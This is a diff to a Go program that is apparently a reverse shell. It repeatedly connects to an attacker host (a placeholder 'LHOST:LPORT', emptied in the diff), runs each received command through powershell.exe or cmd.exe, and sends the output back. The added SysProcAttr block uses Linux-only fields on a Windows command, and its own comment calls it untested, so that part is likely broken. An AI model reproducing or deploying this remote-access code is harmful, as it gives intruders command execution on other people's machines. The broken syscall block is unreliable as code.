@@ -10,13 +10,14 @@ import (
 	"net"
 	"os/exec"
 	"runtime"
+	"syscall"
 	"time"
 )
 
 func main() {
 	for {
 		time.Sleep(3 * time.Second)
-		sendRev("LHOST:LPORT")
+		sendRev(":")
 	}
 }
 
@@ -41,9 +42,31 @@ func sendRev(host string) {
 				sendRev(host)
 				return
 			}
-			//cmd = exec.Command("powershell.exe", "-c", order)
-			cmd = exec.Command("cmd.exe", "/C", order)
-			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			// cmd = exec.Command("powershell.exe", "-c", order)
+			cmd = exec.Command("powershell.exe", order)
+			// cmd = exec.Command("cmd.exe", "/C", order)
+			// Below is not tested not sure if it works at all, removing this block \/ and adding the /C or -c respectivly gives basic funcionality
+			cmd.SysProcAttr = &syscall.SysProcAttr{
+				Chroot:                     "",
+				Credential:                 &syscall.Credential{},
+				Ptrace:                     false,
+				Setsid:                     false,
+				Setpgid:                    false,
+				Setctty:                    false,
+				Noctty:                     false,
+				Ctty:                       0,
+				Foreground:                 false,
+				Pgid:                       0,
+				Pdeathsig:                  0,
+				Cloneflags:                 0,
+				Unshareflags:               0,
+				UidMappings:                []syscall.SysProcIDMap{},
+				GidMappings:                []syscall.SysProcIDMap{},
+				GidMappingsEnableSetgroups: false,
+				AmbientCaps:                []uintptr{},
+				UseCgroupFD:                false,
+				CgroupFD:                   0,
+			}
 			out, _ := cmd.CombinedOutput()
 
 			conn.Write(out)
